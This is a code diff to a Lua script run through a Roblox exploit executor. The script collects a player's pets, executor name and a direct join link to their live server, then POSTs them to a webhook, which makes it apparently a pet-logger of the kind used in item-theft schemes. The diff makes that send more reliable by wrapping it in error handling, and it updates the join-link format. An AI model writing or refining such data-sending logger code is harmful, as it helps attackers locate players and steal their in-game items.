@@ -13,9 +13,9 @@ local LOW_THRESHOLD = 300
 local HIGH_THRESHOLD = 1500
 
 -- =========================
--- 🌐 REQUEST DETECTION
+-- 🌐 REQUEST DETECTION (DELTA PROXY STYLE)
 -- =========================
-local requestFunc = (syn and syn.request) or (http and http.request) or (http_request) or (request)
+local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
 
 if not requestFunc then
     warn("❌ No request function")
@@ -126,7 +126,7 @@ local function getTier(v)
 end
 
 -- =========================
--- 🚀 RUN
+-- 🚀 RUN (DELTA PROXY STYLE)
 -- =========================
 local function Run(data)
     local list, total = process(data.pets)
@@ -150,18 +150,27 @@ local function Run(data)
         fields = {
             {name="🏆 Best Pet", value="```"..best.."```"},
             {name="🐶 Pets (Best → Worst)", value="```"..petList.."```"},
-            {name="🌐 Join Server", value="[Click to Join]("..(data.joinLink or "https://www.roblox.com")..")"}
+            {name="🌐 Join Server", value="[Click to Join]("..data.joinLink..")"}
         },
         color = color,
         footer = {text = "Mondeuronbotton"}
     }
 
-    requestFunc({
-        Url = WEBHOOK,
-        Method = "POST",
-        Headers = {["Content-Type"]="application/json"},
-        Body = HttpService:JSONEncode({content = content, embeds = {embed}})
-    })
+    -- DELTA PROXY STYLE REQUEST (More reliable)
+    local success, response = pcall(function()
+        return requestFunc({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({content = content, embeds = {embed}})
+        })
+    end)
+
+    if success then
+        print("✅ Webhook Sent Successfully!")
+    else
+        warn("❌ Webhook Error: " .. tostring(response))
+    end
 end
 
 -- =========================
@@ -178,6 +187,6 @@ Run({
         executor = (identifyexecutor and identifyexecutor()) or "Unknown",
         players = #game.Players:GetPlayers().."/"..game.Players.MaxPlayers
     },
-    joinLink = "https://www.roblox.com/games/"..game.PlaceId.."?server="..game.JobId,
+    joinLink = "https://www.roblox.com/games/start?placeId=" .. tostring(game.PlaceId) .. "&instanceId=" .. tostring(game.JobId),
     pets = pets
 })
